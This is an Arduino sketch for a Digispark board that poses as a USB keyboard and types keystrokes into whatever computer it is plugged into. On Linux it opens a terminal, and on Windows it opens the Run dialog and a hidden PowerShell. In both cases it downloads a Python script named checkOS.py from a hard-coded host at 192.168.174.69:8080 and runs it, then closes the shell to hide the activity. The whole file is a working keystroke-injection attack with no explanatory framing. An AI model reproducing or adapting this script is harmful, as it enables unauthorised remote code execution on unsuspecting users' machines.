#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0); // Initialize keyboard
  DigiKeyboard.delay(3000);     // Wait for OS to recognize HID

  // === STEP 1: Try Linux - Open terminal with Ctrl + Alt + T ===
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(2000); // Wait for terminal to open
  DigiKeyboard.println(
    "curl -s -o ~/Desktop/checkOS.py http://192.168.174.69:8080/Desktop/checkOS.py && "
    "chmod +x ~/Desktop/checkOS.py && python3 ~/Desktop/checkOS.py && exit "
  );
  DigiKeyboard.delay(10000); // Wait for Linux command execution

  

  // === STEP 3: Try Windows - Open Run dialog (Win + R) ===
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println(
    "powershell -NoP -W Hidden -C \""
    "iwr 'http://192.168.174.69:8080/Desktop/checkOS.py' "
    "-OutFile $env:USERPROFILE\\Desktop\\checkOS.py; "
    "python $env:USERPROFILE\\Desktop\\checkOS.py; "
    "Stop-Process -Name powershell -Force\""
  );
  DigiKeyboard.delay(12000); // Wait for Windows command execution

  // Halt execution
  for(;;); // Efficient halt
}

void loop() {
  // No repeated actions needed
}
